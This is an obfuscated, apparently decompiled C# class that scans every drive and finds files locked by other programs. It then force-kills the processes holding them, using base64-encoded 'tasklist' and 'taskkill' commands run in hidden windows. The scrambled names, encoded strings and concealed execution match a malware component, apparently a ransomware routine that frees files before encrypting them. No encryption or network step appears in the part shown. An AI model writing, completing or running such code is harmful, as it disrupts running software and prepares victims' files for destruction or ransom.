using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;

namespace vQzMGKHeycFziMq;

internal class MYiVoJiDPuw
{
	[CompilerGenerated]
	private sealed class mtcBSrFrFrcw
	{
		public string sColXskeVTzPF;

		public bool _003CKillproc_003Eb__4(string t)
		{
			return t.Contains(sColXskeVTzPF);
		}
	}

	public static readonly List<string> LQZbnIzcrTd = new List<string>();

	public static readonly List<string> IDzAeXqArtHpl = new List<string>();

	public static void moQTqwUGTXm()
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				if (driveInfo.IsReady)
				{
					ZFLqaWIPgcc(driveInfo.Name);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public static void ZFLqaWIPgcc(string yXEiyMWkSPr)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(yXEiyMWkSPr);
			FileInfo[] files = directoryInfo.GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				try
				{
					LQZbnIzcrTd.Add(fileInfo.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				try
				{
					ZFLqaWIPgcc(directoryInfo2.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
		}
		catch
		{
		}
		if (LQZbnIzcrTd.Count <= 0)
		{
			return;
		}
		foreach (string item in LQZbnIzcrTd.Where((string WtNCKHbibrlfXP) => iXUrCyWwbDDP(WtNCKHbibrlfXP)))
		{
			IDzAeXqArtHpl.Add(item);
		}
		LQZbnIzcrTd.Clear();
		if (IDzAeXqArtHpl.Count <= 0)
		{
			return;
		}
		foreach (FileInfo item2 in IDzAeXqArtHpl.Select((string FefFcCfsQRReeT) => new FileInfo(FefFcCfsQRReeT)))
		{
			jBdsvnmIaKEzR(item2.Name);
		}
	}

	public static bool iXUrCyWwbDDP(string VASLvrNZyQtFW)
	{
		FileStream fileStream = null;
		try
		{
			fileStream = File.Open(VASLvrNZyQtFW, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		}
		catch (UnauthorizedAccessException)
		{
			try
			{
				fileStream = File.Open(VASLvrNZyQtFW, FileMode.Open, FileAccess.Read, FileShare.None);
			}
			catch (Exception)
			{
				return true;
			}
		}
		catch (Exception)
		{
			return true;
		}
		finally
		{
			fileStream.Close();
		}
		return false;
	}

	public static void jBdsvnmIaKEzR(string RyhQkgCKPX)
	{
		try
		{
			string text = bEAshCqRjPAYiDvq(yzZnBHwSsJOOcf.jLGThbkXlozfB("dGFza2xpc3Q="), yzZnBHwSsJOOcf.jLGThbkXlozfB("L3YgL2ZvIGNzdg=="));
			string[] separator = new string[1] { "\r\n" };
			string[] source = text.Split(separator, StringSplitOptions.None);
			List<string> list = (from t in source
				where t.Contains(RyhQkgCKPX)
				select t into oRTlvtMevd
				select oRTlvtMevd.Split(new char[1] { ',' }) into zuTkUpivwUu
				select zuTkUpivwUu[1].Replace("\"", "")).ToList();
			foreach (string item in list)
			{
				bEAshCqRjPAYiDvq(yzZnBHwSsJOOcf.jLGThbkXlozfB("dGFza2tpbGw="), yzZnBHwSsJOOcf.jLGThbkXlozfB("L2YgL3BpZCA=") + item);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string bEAshCqRjPAYiDvq(string ExjDyoDytnri, string RqqjVQHEOfEqn)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(ExjDyoDytnri, RqqjVQHEOfEqn);
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.RedirectStandardError = true;
			processStartInfo.StandardOutputEncoding = Encoding.GetEncoding("UTF-8");
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			Process process = Process.Start(processStartInfo);
			string text;
			using (StreamReader streamReader = process.StandardOutput)
			{
				text = streamReader.ReadToEnd();
			}
			string text2;
			using (StreamReader streamReader2 = process.StandardError)
			{
				text2 = streamReader2.ReadToEnd();
			}
			process.WaitForExit();
			return text2 + text;
		}
		catch (Exception ex)
		{
			return ex.Message + "\n<------------>\n" + ex.StackTrace;
		}
	}
}
